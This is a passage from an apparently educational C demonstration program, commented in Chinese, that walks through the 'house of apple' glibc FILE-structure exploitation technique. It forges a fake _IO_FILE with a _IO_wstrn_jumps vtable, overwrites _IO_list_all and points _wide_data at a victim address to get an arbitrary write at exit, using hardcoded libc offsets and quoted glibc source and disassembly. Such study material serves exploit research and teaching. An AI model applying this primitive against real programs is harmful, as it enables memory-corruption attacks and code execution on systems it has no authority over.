class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _flags;\t\t/* High-order word is _IO_MAGIC; rest is flags. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following pointers correspond to the C++ streambuf protocol. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_buf_end;\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_save_base; /* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_backup_base;  /* Pointer to first valid character of backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char *_IO_save_end; /* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_marker *_markers;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_FILE *_chain;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _fileno;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int _flags2;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __off_t _old_offset; /* This used to be _offset but it&#x27;s too small.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* 1+column number of pbase(); 0 is unknown. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  unsigned short _cur_column;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  signed char _vtable_offset;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_t *_lock;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_USE_OLD_IO_FILE\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们需要使用伪造的_IO_FILE_complete_plus结构体，并将这个伪造结构体的地址写到_IO_list_all。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在调用exit函数后，结构体需要执行_IO_wstrn_overflow函数，这需要vtable填入_IO_wstrn_jumps的地址。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/vswprintf.c, line 33)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;static wint_t\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wstrn_overflow (FILE *fp, wint_t c)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* When we come to here this means the user supplied buffer is\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     filled.  But since we must return the number of characters which\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     would have been written in total we must provide a buffer for\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     further use.  We can do this by writing on and on in the overflow\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     buffer in the _IO_wstrnfile structure.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_wstrnfile *snf = (_IO_wstrnfile *) fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\033[1;31m  if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      _IO_wsetb (fp, snf-&gt;overflow_buf,\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t      / sizeof (wchar_t)), 0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t      + (sizeof (snf-&gt;overflow_buf)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t\t / sizeof (wchar_t)));\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* Since we are not really interested in storing the characters\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     which do not fit in the buffer we simply ignore it.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return c;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_wide_data字段的结构体内容：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/libio.h, line 121)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_wide_data\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_ptr;\t/* Current read pointer */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_end;\t/* End of get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_read_base;\t/* Start of putback+get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_base;\t/* Start of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_ptr;\t/* Current put pointer. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_write_end;\t/* End of put area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_base;\t/* Start of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_buf_end;\t\t/* End of reserve area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* The following fields are used to support backing up and undo. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_base;\t/* Pointer to start of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_backup_base;\t/* Pointer to first valid character of\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t   backup area */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t *_IO_save_end;\t/* Pointer to end of non-current get area. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  __mbstate_t _IO_last_state;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_codecvt _codecvt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t _shortbuf[1];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *_wide_vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;注意红色部分的代码，在假结构体中，我们可以控制_wide_data指针的值，因此可以实现在任意位置写入任意值。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是_IO_wstrnfile结构体的定义部分：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/strfile.h, line 49)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;struct _IO_streambuf\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE _f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  const struct _IO_jump_t *vtable;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct _IO_strfile_\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_streambuf _sbf;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  struct _IO_str_fields _s;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_strfile;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;/* frozen: set when the program has requested that the array object not\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   be altered, reallocated, or freed. */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#define _IO_STR_FROZEN(FP) ((FP)-&gt;_f._flags &amp; _IO_USER_BUF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_strfile f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is used for the characters which do not fit in the buffer\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     provided by the user.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  char overflow_buf[64];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_strnfile;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;extern const struct _IO_jump_t _IO_strn_jumps attribute_hidden;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;typedef struct\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_strfile f;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  /* This is used for the characters which do not fit in the buffer\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;     provided by the user.  */\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  wchar_t overflow_buf[64];\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125; _IO_wstrnfile;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;可以看到写入的地址值也是我们可以控制的。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;需要注意的是，&quot;</span>);</span><br><span class="line">    printf_color(RED, HIGHLIGHT, <span class="string">&quot;_IO_wstrn_overflow函数在IDA中的符号表中并不存在。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;因此在调试时最好可以添加glibc的源码辅助进行调试，效果更好。&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;使用dir + 源码目录即可添加源码。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外，可以通过https://libc.rip/查询到所有符号的偏移，&quot;</span></span><br><span class="line">                                                        <span class="string">&quot;但数据库中尚未保存本测试环境使用的新版本的libc。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;通过对_IO_wstrn_jumps跳转表的定义可以大致筛选出_IO_wstrn_jumps的几个地址。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;在__libc_IO_vtables段进行查询，可以找到两个候选的地址：0x82F80和0x847C0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;对应3个不同的_IO_jump_t结构体：0x215DC0、0x215E80、0x216180。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;经过gdb调试可知，_IO_wstrn_jumps的地址偏移应为0x215DC0，_IO_wstrn_overflow为0x82F80。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们首先获取libc地址和基地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> libc_base = (<span class="type">size_t</span>)<span class="built_in">puts</span> - <span class="number">0x80ED0</span>;  <span class="comment">// puts函数的偏移</span></span><br><span class="line">    FILE* fake_FILE = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;libc基地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n&quot;</span> STR_END, libc_base);</span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;堆地址：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> BLUE <span class="string">&quot;m%#zx\n\n&quot;</span> STR_END, (<span class="type">size_t</span>)fake_FILE);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面，我们将malloc出来的地址作为假_IO_FILE_complete_plus的地址，并修改_IO_list_all。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/genops.c， line 684)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;int\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_flush_all_lockp (int do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  int result = 0;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  FILE *fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_start_noarg (flush_cleanup);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_lock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  \033[1;31mfor (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = fp;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_flockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   || (_IO_vtable_offset (fp) == 0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t\t\t\t    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t   )\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\tresult = EOF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      if (do_lock)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\t_IO_funlockfile (fp);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;      run_fp = NULL;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    &#125;\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#ifdef _IO_MTSAFE_IO\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_lock_unlock (list_all_lock);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  _IO_cleanup_region_end (0);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;#endif\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  return result;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, HIGHLIGHT, <span class="string">&quot;依然需要注意_IO_flush_all_lockp中的判断条件。\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_ptr = (<span class="type">char</span>*)<span class="number">1</span>;</span><br><span class="line">    fake_FILE-&gt;_IO_write_base = (<span class="type">char</span>*)<span class="number">0</span>;</span><br><span class="line">    ((<span class="type">size_t</span>*)fake_FILE)[<span class="number">0xd8</span> / <span class="number">8</span>] = libc_base + <span class="number">0x215DC0</span>;</span><br><span class="line">    <span class="type">size_t</span>* IO_list_all = (<span class="type">size_t</span> *) (libc_base + <span class="number">0x21A680</span>);</span><br><span class="line">    *IO_list_all = (<span class="type">size_t</span>)fake_FILE;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们想要修改的地址为：&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;&quot;</span> RED <span class="string">&quot;m%#zx\n&quot;</span> STR_END, (<span class="type">size_t</span>)victim);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;下面是通过GDB查看到的_IO_wstrn_overflow函数的汇编：\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;=&gt; 0x7ffff7e02f80 &lt;_IO_wstrn_overflow&gt;:\tendbr64 \n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f84 &lt;_IO_wstrn_overflow+4&gt;:\tpush   r12\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f86 &lt;_IO_wstrn_overflow+6&gt;:\tmov    r12d,esi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f89 &lt;_IO_wstrn_overflow+9&gt;:\t\033[1;31mlea    rsi,[rdi+0xf0]\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f90 &lt;_IO_wstrn_overflow+16&gt;:\tpush   rbx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f91 &lt;_IO_wstrn_overflow+17&gt;:\tmovq   xmm0,rsi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f96 &lt;_IO_wstrn_overflow+22&gt;:\tpunpcklqdq xmm0,xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f9a &lt;_IO_wstrn_overflow+26&gt;:\tsub    rsp,0x28\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02f9e &lt;_IO_wstrn_overflow+30&gt;:\t\033[1;31mmov    rdx,QWORD PTR [rdi+0xa0]\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fa5 &lt;_IO_wstrn_overflow+37&gt;:\t\033[1;31mcmp    QWORD PTR [rdx+0x30],rsi\n\033[1;&quot;</span> PURPLE <span class="string">&quot;m&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fa9 &lt;_IO_wstrn_overflow+41&gt;:\tje     0x7ffff7e02fec &lt;_IO_wstrn_overflow+108&gt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fab &lt;_IO_wstrn_overflow+43&gt;:\tmovq   xmm1,rsi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb0 &lt;_IO_wstrn_overflow+48&gt;:\tmov    rbx,rdi\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb3 &lt;_IO_wstrn_overflow+51&gt;:\txor    ecx,ecx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fb5 &lt;_IO_wstrn_overflow+53&gt;:\tmovaps XMMWORD PTR [rsp+0x10],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fba &lt;_IO_wstrn_overflow+58&gt;:\tlea    rdx,[rdi+0x1f0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fc1 &lt;_IO_wstrn_overflow+65&gt;:\tmovq   xmm2,rdx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fc6 &lt;_IO_wstrn_overflow+70&gt;:\tpunpcklqdq xmm1,xmm2\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fca &lt;_IO_wstrn_overflow+74&gt;:\tmovaps XMMWORD PTR [rsp],xmm1\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fce &lt;_IO_wstrn_overflow+78&gt;:\tcall   0x7ffff7e03610 &lt;__GI__IO_wsetb&gt;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fd3 &lt;_IO_wstrn_overflow+83&gt;:\tmovdqa xmm1,XMMWORD PTR [rsp]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fd8 &lt;_IO_wstrn_overflow+88&gt;:\tmov    rdx,QWORD PTR [rbx+0xa0]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fdf &lt;_IO_wstrn_overflow+95&gt;:\tmovdqa xmm0,XMMWORD PTR [rsp+0x10]\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fe5 &lt;_IO_wstrn_overflow+101&gt;:\tmovups XMMWORD PTR [rdx],xmm1\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fe8 &lt;_IO_wstrn_overflow+104&gt;:\tmovups XMMWORD PTR [rdx+0x10],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02fec &lt;_IO_wstrn_overflow+108&gt;:\tmovups XMMWORD PTR [rdx+0x20],xmm0\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff0 &lt;_IO_wstrn_overflow+112&gt;:\tadd    rsp,0x28\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff4 &lt;_IO_wstrn_overflow+116&gt;:\tmov    eax,r12d\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff7 &lt;_IO_wstrn_overflow+119&gt;:\tpop    rbx\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ff8 &lt;_IO_wstrn_overflow+120&gt;:\tpop    r12\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;   0x7ffff7e02ffa &lt;_IO_wstrn_overflow+122&gt;:\tret\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;上面的红色部分就是函数中的if语句比较部分，可见overflow_buf在结构体中的偏移量为0xF0。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;另外看一下_IO_wsetb函数：\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(BLUE, HIGHLIGHT, <span class="string">&quot;(/libio/wgenops.c, line 91)\n&quot;</span>);</span><br><span class="line">    printf_color(PURPLE, HIGHLIGHT,</span><br><span class="line">                 <span class="string">&quot;void\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#123;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF))\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    free (f-&gt;_wide_data-&gt;_IO_buf_base);\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  f-&gt;_wide_data-&gt;_IO_buf_base = b;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  f-&gt;_wide_data-&gt;_IO_buf_end = eb;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  if (a)\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;  else\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;    f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;\n&quot;</span></span><br><span class="line">                 <span class="string">&quot;&#125;\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;显然这里如果我们要伪造_wide_data，就必须绕过第一个if语句。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;如果要写入的地址一开始的_IO_buf_base处就是0，那么这个语句可以直接跳过。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;但更多时候这里的值可能不是确定的，因此需要第二个判断条件。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;_IO_FLAGS2_USER_WBUF的值为8，即让f-&gt;_flags2 &amp; 8 != 0即可。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_flags2 = <span class="number">0x8</span>;</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;我们将这里修改为目标地址。\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_FILE-&gt;_wide_data = (<span class="keyword">struct</span> _IO_wide_data *) (<span class="type">char</span> *) victim;</span><br><span class="line"></span><br><span class="line">    printf_color(YELLOW, HIGHLIGHT, <span class="string">&quot;修改前：\n&quot;</span>);</span><br><span class="line">    print_binary((<span class="type">char</span>*)victim, <span class="number">0x80</span>);</span><br><span class="line"></span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;为了能够在exit函数调用后看到修改后的目标地址内容，需要另外一个假FILE结构体。\n&quot;</span>);</span><br><span class="line">    printf_color(GREEN, UNDEFINED, <span class="string">&quot;实际上在house of apple之后，也多使用另一个FILE结构体进行其他的操作。\n&quot;</span>);</span><br><span 